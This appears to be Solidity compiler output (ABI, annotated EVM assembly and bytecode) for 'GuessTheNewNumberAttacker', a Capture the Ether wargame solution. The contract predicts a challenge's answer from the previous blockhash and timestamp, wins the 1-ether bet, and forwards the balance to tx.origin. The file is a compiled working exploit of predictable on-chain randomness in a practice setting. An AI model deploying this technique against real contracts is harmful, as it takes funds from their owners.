{
	"CaptureTheEther/GuessTheNewNumberHack.sol": {
		"GuessTheNewNumberAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "challengeAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "challenge",
					"outputs": [
						{
							"internalType": "contract IGuessTheNewNumberChallenge",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":171:918  contract GuessTheNewNumberAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":267:380  constructor (address challengeAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":356:372  challengeAddress */\n  dup1\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":316:325  challenge */\n  0x00\n  dup1\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":316:373  challenge = IGuessTheNewNumberChallenge(challengeAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":267:380  constructor (address challengeAddress) {... */\n  pop\n    /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":171:918  contract GuessTheNewNumberAttacker {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":171:918  contract GuessTheNewNumberAttacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd2ef7398\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":386:881  function attack() external payable {... */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":212:256  IGuessTheNewNumberChallenge public challenge */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":386:881  function attack() external payable {... */\n    tag_8:\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":522:529  1 ether */\n      0x0de0b6b3a7640000\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":497:518  address(this).balance */\n      selfbalance\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":497:529  address(this).balance >= 1 ether */\n      lt\n      iszero\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":489:550  require(address(this).balance >= 1 ether, \"not enough funds\") */\n      tag_13\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x10\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x6e6f7420656e6f7567682066756e647300000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_13:\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":558:570  uint8 answer */\n      0x00\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":648:649  1 */\n      0x01\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":633:645  block.number */\n      number\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":633:649  block.number - 1 */\n      sub\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":623:650  blockhash(block.number - 1) */\n      blockhash\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":652:667  block.timestamp */\n      timestamp\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":606:668  abi.encodePacked(blockhash(block.number - 1), block.timestamp) */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":596:669  keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":579:677  uint256(... */\n      0x00\n      shr\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":558:678  uint8 answer = uint8(uint256(... */\n      swap1\n      pop\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":686:695  challenge */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":686:701  challenge.guess */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x4ba4c16b\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":709:716  1 ether */\n      0x0de0b6b3a7640000\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":718:724  answer */\n      dup4\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":686:725  challenge.guess{value: 1 ether}(answer) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":742:751  challenge */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":742:762  challenge.isComplete */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xb2fa1c9e\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":742:764  challenge.isComplete() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_19:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":734:792  require(challenge.isComplete(), \"challenge not completed\") */\n      tag_21\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x17\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x6368616c6c656e6765206e6f7420636f6d706c65746564000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_21:\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":833:842  tx.origin */\n      origin\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":833:851  tx.origin.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":833:874  tx.origin.transfer(address(this).balance) */\n      0x08fc\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":852:873  address(this).balance */\n      selfbalance\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":833:874  tx.origin.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":386:881  function attack() external payable {... */\n      pop\n      jump\t// out\n        /* \"CaptureTheEther/GuessTheNewNumberHack.sol\":212:256  IGuessTheNewNumberChallenge public challenge */\n    tag_11:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220fd54fdd4ab371effcf65786e15cfda5462c84d84968dc0ee173abd1c70353af664736f6c63430007060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405161041e38038061041e8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061038a806100946000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc14610039578063d2ef73981461004357610034565b3661003457005b600080fd5b610041610084565b005b34801561004f57600080fd5b50610058610330565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b670de0b6b3a7640000471015610102576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f6e6f7420656e6f7567682066756e64730000000000000000000000000000000081525060200191505060405180910390fd5b600060014303404260405160200180838152602001828152602001925050506040516020818303038152906040528051906020012060001c905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634ba4c16b670de0b6b3a7640000836040518363ffffffff1660e01b8152600401808260ff1681526020019150506000604051808303818588803b1580156101ba57600080fd5b505af11580156101ce573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff1660e01b815260040160206040518083038186803b15801561023957600080fd5b505afa15801561024d573d6000803e3d6000fd5b505050506040513d602081101561026357600080fd5b81019080805190602001909291905050506102e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f6368616c6c656e6765206e6f7420636f6d706c6574656400000000000000000081525060200191505060405180910390fd5b3273ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561032c573d6000803e3d6000fd5b5050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea2646970667358221220fd54fdd4ab371effcf65786e15cfda5462c84d84968dc0ee173abd1c70353af664736f6c63430007060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x41E CODESIZE SUB DUP1 PUSH2 0x41E DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x38A DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x84 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x58 PUSH2 0x330 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH8 0xDE0B6B3A7640000 SELFBALANCE LT ISZERO PUSH2 0x102 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x10 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x6E6F7420656E6F7567682066756E647300000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4BA4C16B PUSH8 0xDE0B6B3A7640000 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1CE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB2FA1C9E PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x239 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x24D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x263 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x2E6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x17 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x6368616C6C656E6765206E6F7420636F6D706C65746564000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x32C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 REVERT SLOAD REVERT 0xD4 0xAB CALLDATACOPY 0x1E SELFDESTRUCT 0xCF PUSH6 0x786E15CFDA54 PUSH3 0xC84D84 SWAP7 DUP14 0xC0 0xEE OR GASPRICE 0xBD SHR PUSH17 0x353AF664736F6C63430007060033000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "181200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"challenge()": "1044"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"challenge()": "d2ef7398"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 14,
						"contract": "CaptureTheEther/GuessTheNewNumberHack.sol:GuessTheNewNumberAttacker",
						"label": "challenge",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IGuessTheNewNumberChallenge)12"
					}
				],
				"types": {
					"t_contract(IGuessTheNewNumberChallenge)12": {
						"encoding": "inplace",
						"label": "contract IGuessTheNewNumberChallenge",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}